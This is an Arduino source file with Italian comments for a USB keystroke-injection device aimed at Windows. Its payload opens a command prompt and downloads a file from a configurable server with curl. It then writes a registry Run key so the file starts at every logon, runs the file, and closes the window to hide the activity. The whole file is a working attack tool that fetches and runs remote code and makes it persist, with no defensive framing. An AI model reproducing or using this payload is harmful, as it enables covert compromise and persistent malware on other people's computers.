

#include <Arduino.h>
#include "USB.h"
#include "USBHIDKeyboard.h"

#define KEY_KP_2 0xE2

USBHIDKeyboard Keyboard;

String serverIp;
String filePath;
String fileName;

void setupPayloads(String ip, String path, String name){

  serverIp = ip;
  filePath = path;
  fileName = name;

  Keyboard.begin();

  USB.begin();

}

// Funzione per aprire il cmd
void openCmd() {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(500);
  Keyboard.releaseAll();
  delay(500);

  Keyboard.print("cmd");
  delay(500);
  Keyboard.press(KEY_RETURN);
  delay(500);
  Keyboard.releaseAll();
}

void doppioApice(){

  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_KP_2);
  delay(100);
  Keyboard.releaseAll();
  //mette il doppio apice
}

void payload1(){

  // Funzione per aprire cmd
  openCmd();
  delay(100);
  Keyboard.print("cd ../Public/Documents");

  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.print("curl -O ");

  doppioApice();
  
  Keyboard.print(serverIp);
  Keyboard.print(filePath);
  Keyboard.print(fileName);

  doppioApice();

  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  delay(2000);

  Keyboard.print("reg add ");
  doppioApice();
  //mette il doppio apice
  Keyboard.print("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run");
  doppioApice();
  //mette il doppio apice
  Keyboard.print(" /v ");
  Keyboard.print(fileName);
  Keyboard.print(" /d ");
  doppioApice();
  //mette il doppio apice
  Keyboard.print("C:\\Users\\Public\\Documents\\");
  Keyboard.print(fileName);
  doppioApice();
  //mette il doppio apice
  Keyboard.print(" /f");

  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.println(fileName);

  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  delay(4000);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  delay(500);
  Keyboard.releaseAll();
  delay(500);

  Keyboard.end();

}